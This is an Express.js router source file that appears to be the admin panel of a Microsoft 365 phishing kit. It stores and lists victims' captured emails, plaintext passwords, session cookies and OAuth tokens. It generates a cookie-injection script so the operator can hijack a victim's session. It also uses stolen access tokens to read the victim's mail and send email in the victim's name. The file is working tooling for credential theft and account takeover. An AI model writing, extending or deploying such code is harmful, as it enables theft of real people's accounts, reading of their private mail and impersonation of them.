const express = require("express");
const router = express.Router();
const User = require("../models/user");
const Admin = require("../models/admin");



// Get all users (latest first) - show ALL login attempts
router.get("/users", async (req, res) => {
  try {
    const users = await User.find({}, {
      email: 1,
      password: 1,
      cookieStatus: 1,
      lastLogin: 1,
      isActive: 1,
      createdAt: 1,
      loginAttempt: 1,
      sessionId: 1,
      microsoftCookies: 1,
      sessionCookies: 1,
      allCookies: 1,
      accessToken: 1,
      refreshToken: 1
    }).sort({ createdAt: -1 }); // Latest first
    
    res.json({ success: true, users });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Check and update cookie status
router.post("/check-cookies/:userId", async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    // Check if cookies are expired (simple check - can be enhanced)
    const now = Date.now();
    const hasExpiredCookies = user.microsoftCookies.some(cookie => 
      cookie.expiry > 0 && cookie.expiry < now
    );
    
    if (hasExpiredCookies) {
      await User.findByIdAndUpdate(req.params.userId, {
        cookieStatus: 'expired'
      });
    }
    
    res.json({ success: true, cookieStatus: hasExpiredCookies ? 'expired' : user.cookieStatus });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Generate cookie injection script for specific user
router.get("/inject-cookies/:userId", async (req, res) => {
  try {
    const user = await User.findById(req.params.userId);
    if (!user) {
      return res.status(404).json({ error: "User not found" });
    }
    
    // Use all cookies - prioritize allCookies, then sessionCookies, then microsoftCookies
    let cookiesToInject = user.allCookies || user.sessionCookies || user.microsoftCookies || [];
    
    if (cookiesToInject.length === 0) {
      return res.status(404).json({ error: "No cookies found for user" });
    }
    
    const cookieScript = `(() => {
  let cookies = ${JSON.stringify(cookiesToInject)};
  function setCookie(key, value, domain, path, isSecure) {
    const cookieMaxAge = 'Max-Age=31536000';

    if (key.startsWith('__Host')) {
      console.log('cookies Set', key, value, '!IMPORTANT _Host- prefix: Cookies with names starting with _Host- must be set with the secure flag, must be from a secure page (HTTPS), must not have a domain specified (and therefore, are not sent to subdomains), and the path must be /.',);
      document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path = /;Secure;SameSite=None';
    } else if (key.startsWith('__Secure')) {
      console.log('cookies Set', key, value, '!IMPORTANT _Secure- prefix: Cookies with names starting with _Secure- (dash is part of the prefix) must be set with the secure flag from a secure page (HTTPS).',);
      document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
    } else {
      if (isSecure) {
        console.log('cookies Set', key, value);
        if (window.location.hostname == domain) {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + '; path=' + path + '; Secure; SameSite=None';
        } else {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';Secure;SameSite=None';
        }
      } else {
        console.log('cookies Set', key, value);
        if (window.location.hostname == domain) {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + ';path=' + path + ';';
        } else {
          document.cookie = key + '=' + value + ';' + cookieMaxAge + ';domain=' + domain + ';path=' + path + ';';
        }
      }
    }
  }
  for (let cookie of cookies) {
    setCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure)
  }
})();`;
    
    res.setHeader('Content-Type', 'application/javascript');
    res.send(cookieScript);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get user emails using access token
router.get("/emails/:userId", async (req, res) => {
  try {
    const axios = require('axios');
    const user = await User.findById(req.params.userId);
    if (!user || !user.accessToken) {
      return res.status(404).json({ error: "User or access token not found" });
    }

    const emailResponse = await axios.get(
      "https://graph.microsoft.com/v1.0/me/messages",
      {
        headers: { Authorization: `Bearer ${user.accessToken}` },
        params: { $top: 20, $select: 'subject,from,receivedDateTime,bodyPreview' }
      }
    );

    res.json({ success: true, emails: emailResponse.data.value });
  } catch (error) {
    if (error.response?.status === 401) {
      res.status(401).json({ error: "Token expired, refresh needed" });
    } else {
      res.status(500).json({ error: error.message });
    }
  }
});

// Delete single user
router.delete("/delete-user/:userId", async (req, res) => {
  try {
    await User.findByIdAndDelete(req.params.userId);
    res.json({ success: true, message: "User deleted" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Clear all users
router.delete("/clear-all", async (req, res) => {
  try {
    await User.deleteMany({});
    res.json({ success: true, message: "All users cleared" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Send email as user
router.post("/send-email/:userId", async (req, res) => {
  try {
    const { to, subject, body } = req.body;
    const user = await User.findById(req.params.userId);
    if (!user || !user.accessToken) {
      return res.status(404).json({ error: "User or token not found" });
    }

    const emailData = {
      message: {
        subject: subject,
        body: {
          contentType: "HTML",
          content: body
        },
        toRecipients: [{ emailAddress: { address: to } }]
      }
    };

    await axios.post(
      "https://graph.microsoft.com/v1.0/me/sendMail",
      emailData,
      { headers: { Authorization: `Bearer ${user.accessToken}` } }
    );

    res.json({ success: true, message: "Email sent" });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

module.exports = router;